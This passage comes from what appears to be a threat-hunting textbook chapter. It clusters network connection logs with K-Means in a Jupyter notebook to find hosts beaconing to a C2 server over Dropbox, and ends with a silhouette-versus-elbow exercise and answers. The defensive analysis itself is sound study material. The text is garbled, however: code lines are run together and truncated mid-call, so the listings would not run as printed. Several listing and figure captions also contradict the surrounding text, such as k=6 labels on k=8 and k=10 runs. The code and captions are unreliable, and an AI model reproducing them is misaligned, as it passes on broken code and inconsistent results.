    & (~df['dest_ip'].str.contains("239.255.255.250")) \
    & (~df['dest_ip'].str.contains("40.87.160.0")) \
].groupby(['src_ip', 'dest_ip', 'dest_port', 'std1', 'count1']).si Executing the code in Listing 8.33 returns the output shown in Listing 8.34.
Listing 8.34 Jupyter notebook output - Remaining connections in cluster one (1) to investigate
src_ip     dest_ip       dest_port  std1        count1    count 10.0.0.18  162.125.2.14  443        260.311110  237       238
10.0.0.4   162.125.2.14  443        318.035964  188       188
This is the same output we received in Listing 8.27, with k=4, containing the rest of the malicious connections. Let us now apply K-Means with k=8.
8.6 K-Means with k=8
Similar to what we did in the previous section, we first drop column cluster, containing the previously assigned cluster numbers from DataFrame df_features_one_hot_enc. We set the value of k to eight (8) before applying K-Means. We then visualize the clusters using a count plot.
Listing 8.35 Jupyter notebook code - Apply K-Means on df_features_one_hot_enc with k=6
df_features_one_hot_enc =  df_features_one_hot_enc.drop(['cluster'
 
km = KMeans(n_clusters = 8) km.fit(df_features_one_hot_enc)
df_features_one_hot_enc['cluster'] = km.labels_ df_features_one_hot_enc.head()
 
ax = sns.countplot(df_features_one_hot_enc['cluster']) for container in ax.containers:     ax.bar_label(container)
Figure 8.19 Number of data points in each cluster (k=6)

Figure 8.19 Shows the number of data points in each of the six (6) clusters. Compared to the previous run of K-Means with k=6, three of the clusters contain the same number of data points: zero (0), two (2), and four (4). The large cluster containing 40276 datapoints when k=6 has been split into two smaller clusters, one (1) containing 23849 data points and six (6) containing 16427. The largest cluster has always contained 110085 data points for all the values of k we tried so far. There were minor changes to the size of the other clusters from the previous run with k=6.
In this run, we have four (4) small clusters that would interest us: clusters two (2), three (3), five (5), and seven (7).
Notice that we still have a cluster, with label two (2), containing 1883 data points. A quick check confirms that this cluster contains the rest of the malicious connections. Similar to the cases with k=4 and k=6.
Listing 8.36 Jupyter notebook code - Exclude normal traffic by destination port and IP addresses for cluster two (2)
df[
    (df.cluster == 2) \
    & (df['src_ip'].str.startswith("10.")) \
    & (df['dest_port'] != "9997") \
    & (~df['dest_ip'].str.endswith(".255")) \
    & (~df['dest_ip'].str.contains("20.7.1")) \
    & (~df['dest_ip'].str.contains("20.7.2")) \
    & (~df['dest_ip'].str.contains("20.10.31.115")) \
    & (~df['dest_ip'].str.contains("168.63.129.16")) \
    & (~df['dest_ip'].str.contains("169.254.169.254")) \
    & (~df['dest_ip'].str.contains("239.255.255.250")) \
    & (~df['dest_ip'].str.contains("40.87.160.0")) \
].groupby(['src_ip', 'dest_ip', 'dest_port', 'std1', 'count1']).si Executing the code in Listing 8.36 returns the output shown in Listing 8.37.
Listing 8.37 Jupyter notebook output - Remaining connections in cluster four (4) to investigate and adding 40.87.160.0 to the exclusion list
src_ip     dest_ip       dest_port  std1        count1    count 10.0.0.18  162.125.2.14  443        260.311110  237       238
10.0.0.4   162.125.2.14  443        318.035964  188       188
Note
The numbers assigned to clusters can change when we run K-Means with different values of k.
What this tells us is that there are data points that form a cluster that is KMeans would not separate to multiple clusters, at least as we change the value of k to 8. In our case, most of the malicious connections were data points that K-Means mapped to this cluster, along with other data points that share similar features. The cluster contained malicious and benign connections. With this, we conclude the scenario. Let us have an exercise before we summarize the chapter.
8.7 Exercise
Run the silhouette analysis using KElbowVisualizer with k from 2 to 12 (k= (2,12)).
1. Provide the code you used for running silhouette analysis, record the runtime and show the output of running the code.
2. Run the same range of k, but using the elbow method, compare the time it takes for the silhouette analysis versus the elbow method, and compare the proposed optimal value to what we have seen earlier in the chapter.
3. Which is faster, the elbow method or the silhouette analysis, and why?
4. What is the optimal value of k proposed by silhouette? Compare the proposed value to the highest value in the silhouette analysis plot.
5. Run K-Means using k with the highest score in the silhouette plot.
Provide the code you used and a plot showing the size of each cluster.
8.8 Answers to exercise
1. Listing 8.38 shows the code for running the silhouette analysis with k= (2,12). When running the code using a Jupyter notebook, you can use %%time before the code to instruct Jupyter to calculate the time it takes to run the code. Running the code on our system (Using a Jupyter notebook with a Python3 Kernel on a MacBook Pro M1 with 16GB of
RAM) took 34 minutes and 42 seconds (Wall time: 34min 42s). Your runtime would be different.
Listing 8.38 Jupyter notebook code - Apply silhouette analysis with k=(2,12)
%%time
df_features_one_hot_enc =  df_features_one_hot_enc.drop(['cluster' model = KMeans(random_state=1)
visualizer = KElbowVisualizer(model, k=(2,12), metric='silhouette' visualizer.fit(df_features_one_hot_enc) visualizer.show()
The output of running the code in Listing 8.38 is shown in Figure 8.20.
Figure 8.20 Silhouette analysis plot with k=(2,12)

2. Listing 8.39 shows the code for running the elbow method with k= (2,12).
Listing 8.39 Jupyter notebook code - Apply the elbow method with k=(2,12)
%%time
df_features_one_hot_enc =  df_features_one_hot_enc.drop(['cluster' model = KMeans(random_state=1)
visualizer = KElbowVisualizer(model, k=(2,12)) visualizer.fit(df_features_one_hot_enc) visualizer.show()
The output of running the code in Listing 8.39 is shown in Figure 8.21. In our case, running the code took 6.78 seconds which is by far shorter than the time it took for the silhouette analysis to complete. Running the silhouette analysis for the same values of k took 34 minutes and 42 seconds.
Figure 8.21 Elbow method plot with k=(2,12)

The proposed optimal value of k is five (5) and not four (4) proposed earlier in the chapter (refer to Figure 8.11). The reason for this change is that the KElbowVisualizer library code computes and compares differences for all the values of k and then picks one of them. In Figure 8.20, the library analyzed values of k from 2 to 11 (inclusive), compared the differences in scores, and selected five (5), while previously it analyzed values of k from 2 to 9 (inclusive) and selected four (4). The code is published in the following link: https://www.scikit-yb.org/en/latest/_modules/yellowbrick/cluster/elbow.html, which is based on the following whitepaper: https://raghavan.usc.edu//papers/kneedle-simplex11.pdf.
3. The elbow is much faster than the silhouette analysis because the silhouette analysis calculates both the intra- and inter-cluster distances with the neighboring cluster for each data point. On the other hand, the elbow method only calculates the intra-cluster distances for each data point.
4. According to Figure 8.20, the optimal value of k is 8. However, the silhouette score is higher when k=10. The silhouette score is ~0.963 for k=10 and ~0.944 for k=8. Let us use choose k with the highest score; k=10.
5. Listing 8.40 shows the code for running K-Means with k=10.
Listing 8.40 Jupyter notebook code - Apply K-Means on df_features_one_hot_enc with k=6)
df_features_one_hot_enc =  df_features_one_hot_enc.drop(['cluster'
 
km = KMeans(n_clusters = 10) km.fit(df_features_one_hot_enc)
df_features_one_hot_enc['cluster'] = km.labels_ df_features_one_hot_enc.head()
 
ax = sns.countplot(df_features_one_hot_enc['cluster']) for container in ax.containers:     ax.bar_label(container)
Figure 8.22 Number of data points in each cluster (k=6)

Figure 8.22 shows the number of data points in each of the ten (10) clusters. We have six (6) small clusters: one (1), four (4), five (5), seven (7), eight (8), and nine (9). We notice that the size of the largest cluster containing 110085 data points did not change, even with k=10.
This brings us to the end of this chapter. We used K-Means in our hunting expedition to group data points into four (4), six (6), and eight(8) clusters.
We investigated the small clusters representing anomalous connections for each value of k to look for what could be malicious. We investigated the data points mapped to the small clusters, which led us to prove our hypothesis and uncovered malicious activities, confirming our hypothesis: an adversary took control of one or more internal hosts, which then started to beacon with jitter added to a C2 server using Dropbox as a covert channel for C2 communication.
K-Means is a clustering-based unsupervised ML algorithm. We will visit other ML algorithms in the next chapter.
8.9 Summary
 Unlike supervised, unsupervised ML doesn't require you to train models to start threat hunting.
 Unsupervised ML is not perfect. In the case of clustering-based ML, models might map data points to incorrect clusters.
 To achieve the best performance out of ML, spend quality time exploring and processing the data before trying to apply ML algorithms.  Every ML algorithm has its logic (math) and rules, each with parameters you can tune. You can refer to various publications to gain a deeper understanding of the mathematics involved in the techniques and models used in this chapter.
 Avoid Label Encoding as it introduces false order to independent data, which can lead to incorrect conclusions.
 The findings from unsupervised ML can be used to create labeled datasets for the consumption of supervised ML.
 K-Mean is a popular clustering algorithm. There are various clustering algorithms, some of which are variations of K-Means, that you can explore, such as K-Mode, K-Prototype, K-Means++, K-Medoids, XMeans, G-Means, DBSCAN, and OPTICS.
 You would select the appropriate algorithm(s) based on the problem that you are trying to solve. In some cases, you might want to try a few to explore your data before selecting the applicable algorithms.  Exploring the world of clustering algorithms and seeking advice from ML subject matter experts would help select and tune your ML-driven threat hunting expedition.
